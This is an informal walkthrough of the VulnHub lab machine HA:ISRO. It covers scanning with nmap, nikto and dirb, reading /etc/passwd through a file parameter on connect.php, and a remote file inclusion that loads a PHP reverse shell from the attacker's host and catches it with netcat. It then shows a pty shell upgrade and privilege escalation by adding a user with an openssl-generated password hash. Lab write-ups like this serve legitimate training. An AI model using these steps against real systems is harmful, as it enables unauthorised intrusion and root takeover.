# HA:ISRO !~~~~ VULNHUB

quickly dive into enumeration:
:nmap:


![2024-09-16_20-48](https://github.com/user-attachments/assets/8f385e61-ed5a-4909-a562-d2553b72858b)



# NIKTO for finding the hidden directories
![2024-09-16_20-57](https://github.com/user-attachments/assets/db908d8b-f883-41b8-a9ab-98f1afff5bcf)




# ::::::i've run  another tool called dirb for hidden dicrectories searching::::

![2024-09-16_21-05](https://github.com/user-attachments/assets/c144594d-2def-46b1-a02a-61d3571ea09a)


After getting /connect.php i simply search it 
http://192.168.73.147/connect.php {its shows blank so is use another method}
~
`
`





# Then i simply perform url injection for getting the passwd file insidings

http://192.168.73.147/connect.php?file=/etc/passwd

![2024-09-16_21-11](https://github.com/user-attachments/assets/7552f865-0c14-46b2-938f-545621631b38)




# After than i simply look onto RFI vulnarebility which actually it shows , so i begin dig in
FIRSTLY :: i've to generate a reverse shell so i downloaded the file called php-reverse-shell/php 
           then i simply edited my own ip and port will be 1234 
           ![2024-09-17_12-35](https://github.com/user-attachments/assets/a65b7aeb-f543-4e13-96d2-a81d77765425)

2ND-LY  :: I've type in url {{http://192.168.73.147/connect.php?file=http://192.168.73.129:5000/php-reverse-shell.php}}
THIRDL-LY :: equivalently i use nc -lvnp 1234 for getting the shell  
             
![2024-09-17_12-44](https://github.com/user-attachments/assets/98c2a376-7627-4b56-aa13-be0638b70219)

  FINALLY get the shell but not in interactive mode
  so i use python script to generate-interactive mode using 
   [python3 -c "import pty;pty.spawn('/bin/bash') ;" ]
  succesfully in interactive mode 
  but not accessing in root so, performing previledge-escalation  
  # FOr that instance i've to create a openssl session and also genareting hash for our new user and gettin also with root previledges 
                                               {openssl passwd -1 -salt user HA:ISRO}
 

   ![2024-09-17_12-54](https://github.com/user-attachments/assets/782b7a8d-7892-4d0d-8d98-9ce0bcccfcd1)
    
    
    
now i've  create a user called darkey and passwd will be-HA:ISRO
  ![2024-09-17_12-58](https://github.com/user-attachments/assets/aa2c15a7-995d-4db5-9f12-91737df53902)

  

then i simp-lly check weather the new user created or not 


![2024-09-17_13-05](https://github.com/user-attachments/assets/8e8925e2-9e46-4515-b8bd-de397c2522f3)


then accessing the root previledge using new user
then i go to cd root then final.txt and get the flag














